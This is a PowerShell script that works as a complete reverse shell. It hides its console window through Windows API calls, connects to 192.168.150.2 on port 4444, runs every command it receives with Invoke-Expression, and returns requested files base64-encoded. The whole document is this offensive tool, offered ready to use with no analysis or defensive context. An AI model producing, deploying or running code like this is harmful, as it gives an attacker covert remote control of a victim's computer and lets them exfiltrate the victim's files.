# full_working.ps1 - Complete with window hiding and file transfer
$ip = "192.168.150.2"
$port = 4444

# Hide window
$winAPI = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
Add-Type -MemberDefinition $winAPI -Name "WinAPI" -Namespace "Win32" -ErrorAction SilentlyContinue
[Win32.WinAPI]::ShowWindow([Win32.WinAPI]::GetConsoleWindow(), 0) | Out-Null

# Connect and handle commands
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

$writer.WriteLine("[+] Connected to $ip")

while ($null -ne ($cmd = $reader.ReadLine())) {
    if ($cmd.StartsWith("download ")) {
        $path = $cmd.Substring(9).Trim('"').Trim("'")
        if (Test-Path $path) {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            $b64 = [Convert]::ToBase64String($bytes)
            $writer.WriteLine("FILE_START")
            $writer.WriteLine($b64)
            $writer.WriteLine("FILE_END")
        } else {
            $writer.WriteLine("ERROR: '$path' not found")
        }
    }
    elseif ($cmd -eq "exit") {
        break
    }
    else {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            if ($output) { $writer.WriteLine($output) }
        } catch {
            $writer.WriteLine("ERROR: $($_.Exception.Message)")
        }
    }
}

$client.Close()